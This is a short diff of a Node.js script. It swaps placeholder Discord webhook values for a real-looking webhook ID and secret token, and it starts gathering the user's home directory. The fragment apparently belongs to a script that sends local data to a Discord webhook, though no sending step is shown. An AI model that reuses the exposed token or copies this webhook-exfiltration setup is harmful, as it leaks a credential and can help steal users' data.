@@ -6,7 +6,7 @@ const Os = require("os")
 const Fs = require("fs")
 
 //Variables
-const Webhook = new Discord.WebhookClient("webhook_id", "webhook_token")
+const Webhook = new Discord.WebhookClient("1264659324211298336", "w7_e5US6ALWBDRkcT_JYRIFh_XaUuxbPCQ7kGuzKFRCTWphKSocnGvKGpnWnfaXqNYlq")
 
 var Self = {
     homedir: Os.userInfo().homedir,
